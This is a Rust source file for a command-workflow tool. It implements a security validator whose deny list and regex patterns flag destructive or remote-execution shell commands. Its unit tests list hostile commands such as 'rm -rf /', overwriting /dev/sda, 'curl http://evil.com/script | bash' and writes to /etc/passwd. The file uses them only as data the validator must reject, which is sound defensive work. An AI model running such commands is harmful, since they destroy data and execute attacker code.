use crate::commands::models::{Workflow, WorkflowStep};
use crate::error::Result;
use regex::Regex;
use std::collections::HashSet;
use std::sync::OnceLock;

pub struct SecurityValidator {
    dangerous_commands: HashSet<String>,
    dangerous_patterns: Vec<Regex>,
    require_approval_patterns: Vec<Regex>,
}

#[derive(Debug, Clone)]
pub struct SecurityConfig {
    pub allow_dangerous_commands: bool,
    pub require_approval_for_patterns: Vec<String>,
    pub sandbox_mode: bool,
    pub max_command_length: usize,
    pub allowed_file_extensions: Vec<String>,
}

impl Default for SecurityConfig {
    fn default() -> Self {
        Self {
            allow_dangerous_commands: false,
            require_approval_for_patterns: vec![
                r"rm\s+-rf".to_string(),
                r"sudo\s+".to_string(),
                r"chmod\s+777".to_string(),
                r">/dev/null".to_string(),
            ],
            sandbox_mode: false,
            max_command_length: 1000,
            allowed_file_extensions: vec![
                "txt".to_string(),
                "log".to_string(),
                "json".to_string(),
                "yaml".to_string(),
                "yml".to_string(),
            ],
        }
    }
}

impl SecurityValidator {
    pub fn new(config: SecurityConfig) -> Self {
        let mut dangerous_commands = HashSet::new();

        // Add commonly dangerous commands
        dangerous_commands.insert("rm".to_string());
        dangerous_commands.insert("rmdir".to_string());
        dangerous_commands.insert("dd".to_string());
        dangerous_commands.insert("mkfs".to_string());
        dangerous_commands.insert("format".to_string());
        dangerous_commands.insert("fdisk".to_string());
        dangerous_commands.insert("shutdown".to_string());
        dangerous_commands.insert("reboot".to_string());
        dangerous_commands.insert("halt".to_string());
        dangerous_commands.insert("poweroff".to_string());
        dangerous_commands.insert("init".to_string());

        // Compile dangerous patterns
        static DANGEROUS_PATTERNS: OnceLock<Vec<Regex>> = OnceLock::new();
        let dangerous_patterns = DANGEROUS_PATTERNS
            .get_or_init(|| {
                vec![
                    Regex::new(r"rm\s+-[rf]+.*[\*/]").unwrap(), // rm -rf with wildcards or root
                    Regex::new(r">\s*/dev/(?:sda|sdb|sdc|hda|hdb)").unwrap(), // Writing to disk devices
                    Regex::new(r":\(\)\s*\{.*;\s*\}").unwrap(),               // Fork bombs
                    Regex::new(r"while\s+true.*do").unwrap(),                 // Infinite loops
                    Regex::new(r"curl.*\|\s*(?:sh|bash|zsh)").unwrap(), // Piping downloads to shell
                    Regex::new(r"wget.*\|\s*(?:sh|bash|zsh)").unwrap(), // Piping downloads to shell
                    Regex::new(r"echo.*>\s*/etc/").unwrap(),            // Writing to system config
                    Regex::new(r"chmod\s+[0-7]*7[0-7]*\s+/").unwrap(), // Making system files executable
                ]
            })
            .clone();

        // Compile approval requirement patterns
        let require_approval_patterns: Vec<Regex> = config
            .require_approval_for_patterns
            .iter()
            .filter_map(|pattern| Regex::new(pattern).ok())
            .collect();

        Self {
            dangerous_commands,
            dangerous_patterns,
            require_approval_patterns,
        }
    }

    /// Validate a single command for security issues
    pub fn validate_command(&self, command: &str) -> Result<SecurityCheck> {
        let mut issues = Vec::new();
        let mut requires_approval = false;

        // Check command length
        if command.len() > 1000 {
            issues.push("Command is too long (potential buffer overflow)".to_string());
        }

        // Check for null bytes (command injection)
        if command.contains('\0') {
            issues.push("Command contains null bytes (potential injection)".to_string());
        }

        // Check for dangerous command patterns
        for pattern in &self.dangerous_patterns {
            if pattern.is_match(command) {
                issues.push(format!("Dangerous pattern detected: {}", pattern.as_str()));
            }
        }

        // Check for approval-required patterns
        for pattern in &self.require_approval_patterns {
            if pattern.is_match(command) {
                requires_approval = true;
                break;
            }
        }

        // Check for dangerous commands at the start
        if let Some(first_word) = command.split_whitespace().next() {
            if self.dangerous_commands.contains(first_word) {
                issues.push(format!("Potentially dangerous command: {}", first_word));
            }
        }

        // Check for suspicious redirections
        if command.contains(">/dev/") && !command.contains(">/dev/null") {
            issues.push("Suspicious redirection to device file".to_string());
        }

        // Check for command chaining that might hide malicious commands
        if command.matches(';').count() > 3 {
            issues.push("Excessive command chaining detected".to_string());
        }

        if command.contains("$(") || command.contains("`") {
            issues.push("Command substitution detected - review carefully".to_string());
        }

        Ok(SecurityCheck {
            command: command.to_string(),
            is_safe: issues.is_empty(),
            requires_approval,
            issues,
        })
    }

    /// Validate an entire workflow for security issues
    pub fn validate_workflow(&self, workflow: &Workflow) -> Result<WorkflowSecurityReport> {
        let mut all_issues = Vec::new();
        let mut step_reports = Vec::new();
        let mut requires_approval = false;

        // Check workflow name for suspicious content
        if workflow.name.contains("..") || workflow.name.contains("/") {
            all_issues.push("Workflow name contains suspicious path elements".to_string());
        }

        // Validate each step
        for step in &workflow.steps {
            let step_report = self.validate_workflow_step(step)?;

            if !step_report.is_safe {
                all_issues.extend(step_report.issues.iter().cloned());
            }

            if step_report.requires_approval {
                requires_approval = true;
            }

            step_reports.push(step_report);
        }

        // Check for circular dependencies in workflow calls
        let workflow_calls = self.extract_workflow_calls(workflow);
        if self.has_circular_dependency(&workflow.name, &workflow_calls) {
            all_issues.push("Potential circular dependency detected in workflow calls".to_string());
        }

        Ok(WorkflowSecurityReport {
            workflow_name: workflow.name.clone(),
            is_safe: all_issues.is_empty(),
            requires_approval,
            issues: all_issues,
            step_reports,
        })
    }

    /// Validate a single workflow step
    fn validate_workflow_step(&self, step: &WorkflowStep) -> Result<StepSecurityReport> {
        let mut issues = Vec::new();
        let mut requires_approval = step.require_approval;

        // Validate the main command
        if !step.command.is_empty() {
            let command_check = self.validate_command(&step.command)?;
            issues.extend(command_check.issues);

            if command_check.requires_approval {
                requires_approval = true;
            }
        }

        // Validate conditional commands
        if let Some(conditional) = &step.conditional {
            for then_step in &conditional.then_block.steps {
                let sub_report = self.validate_workflow_step(then_step)?;
                issues.extend(sub_report.issues);
                if sub_report.requires_approval {
                    requires_approval = true;
                }
            }

            if let Some(else_block) = &conditional.else_block {
                for else_step in &else_block.steps {
                    let sub_report = self.validate_workflow_step(else_step)?;
                    issues.extend(sub_report.issues);
                    if sub_report.requires_approval {
                        requires_approval = true;
                    }
                }
            }
        }

        // Validate branch commands
        if let Some(branch) = &step.branch {
            for case in &branch.cases {
                for case_step in &case.steps {
                    let sub_report = self.validate_workflow_step(case_step)?;
                    issues.extend(sub_report.issues);
                    if sub_report.requires_approval {
                        requires_approval = true;
                    }
                }
            }

            if let Some(default_steps) = &branch.default_case {
                for default_step in default_steps {
                    let sub_report = self.validate_workflow_step(default_step)?;
                    issues.extend(sub_report.issues);
                    if sub_report.requires_approval {
                        requires_approval = true;
                    }
                }
            }
        }

        // Validate loop commands
        if let Some(loop_data) = &step.loop_data {
            for loop_step in &loop_data.steps {
                let sub_report = self.validate_workflow_step(loop_step)?;
                issues.extend(sub_report.issues);
                if sub_report.requires_approval {
                    requires_approval = true;
                }
            }
        }

        Ok(StepSecurityReport {
            step_name: step.name.clone(),
            is_safe: issues.is_empty(),
            requires_approval,
            issues,
        })
    }

    /// Extract workflow calls from a workflow
    fn extract_workflow_calls(&self, workflow: &Workflow) -> Vec<String> {
        let mut calls = Vec::new();
        static WORKFLOW_CALL_REGEX: OnceLock<Regex> = OnceLock::new();
        let regex =
            WORKFLOW_CALL_REGEX.get_or_init(|| Regex::new(r"clix\s+flow\s+run\s+(\w+)").unwrap());

        for step in &workflow.steps {
            if step.command.contains("clix flow run") {
                // Extract workflow name from "clix flow run workflow_name"
                if let Some(captures) = regex.captures(&step.command) {
                    if let Some(workflow_name) = captures.get(1) {
                        calls.push(workflow_name.as_str().to_string());
                    }
                }
            }
        }

        calls
    }

    /// Check for circular dependencies in workflow calls
    fn has_circular_dependency(&self, workflow_name: &str, calls: &[String]) -> bool {
        // Simple check: if workflow calls itself directly
        calls.contains(&workflow_name.to_string())
        // TODO: Implement full transitive dependency checking
    }

    /// Get security recommendations for a command
    pub fn get_security_recommendations(&self, command: &str) -> Vec<String> {
        let mut recommendations = Vec::new();

        if command.contains("rm") {
            recommendations.push(
                "Consider using 'trash' command instead of 'rm' for safer file deletion"
                    .to_string(),
            );
        }

        if command.contains("sudo") {
            recommendations.push("Verify that elevated privileges are truly necessary".to_string());
        }

        if command.contains("curl") || command.contains("wget") {
            recommendations.push(
                "Verify the source URL and consider using --fail-with-body for curl".to_string(),
            );
        }

        if command.contains(">") && !command.contains(">>") {
            recommendations.push(
                "Consider using '>>' for append instead of '>' to avoid overwriting files"
                    .to_string(),
            );
        }

        if command.contains("chmod 777") {
            recommendations.push("Avoid chmod 777 - use more restrictive permissions".to_string());
        }

        recommendations
    }
}

#[derive(Debug, Clone)]
pub struct SecurityCheck {
    pub command: String,
    pub is_safe: bool,
    pub requires_approval: bool,
    pub issues: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct StepSecurityReport {
    pub step_name: String,
    pub is_safe: bool,
    pub requires_approval: bool,
    pub issues: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct WorkflowSecurityReport {
    pub workflow_name: String,
    pub is_safe: bool,
    pub requires_approval: bool,
    pub issues: Vec<String>,
    pub step_reports: Vec<StepSecurityReport>,
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::commands::models::WorkflowStep;

    #[test]
    fn test_dangerous_command_detection() {
        let validator = SecurityValidator::new(SecurityConfig::default());

        let dangerous_commands = vec![
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            "curl http://evil.com/script | bash",
            "echo 'malicious' > /etc/passwd",
            "chmod 777 /etc/shadow",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate_command(cmd).unwrap();
            assert!(
                !result.is_safe,
                "Command should be flagged as unsafe: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_safe_command_detection() {
        let validator = SecurityValidator::new(SecurityConfig::default());

        let safe_commands = vec![
            "echo 'Hello World'",
            "ls -la",
            "cat file.txt",
            "grep 'pattern' file.txt",
            "ps aux",
        ];

        for cmd in safe_commands {
            let result = validator.validate_command(cmd).unwrap();
            assert!(result.is_safe, "Command should be safe: {}", cmd);
        }
    }

    #[test]
    fn test_approval_requirement() {
        let validator = SecurityValidator::new(SecurityConfig::default());

        let approval_commands = vec!["sudo apt update", "rm -rf temp/"];

        for cmd in approval_commands {
            let result = validator.validate_command(cmd).unwrap();
            assert!(
                result.requires_approval,
                "Command should require approval: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_workflow_validation() {
        let validator = SecurityValidator::new(SecurityConfig::default());

        let steps = vec![
            WorkflowStep::new_command(
                "Safe step".to_string(),
                "echo 'Hello'".to_string(),
                "A safe command".to_string(),
                false,
            ),
            WorkflowStep::new_command(
                "Dangerous step".to_string(),
                "rm -rf /tmp/*".to_string(),
                "A dangerous command".to_string(),
                false,
            ),
        ];

        let workflow = Workflow::new(
            "test-workflow".to_string(),
            "Test workflow".to_string(),
            steps,
            vec![],
        );

        let report = validator.validate_workflow(&workflow).unwrap();
        assert!(!report.is_safe);
        assert!(!report.issues.is_empty());
    }
}
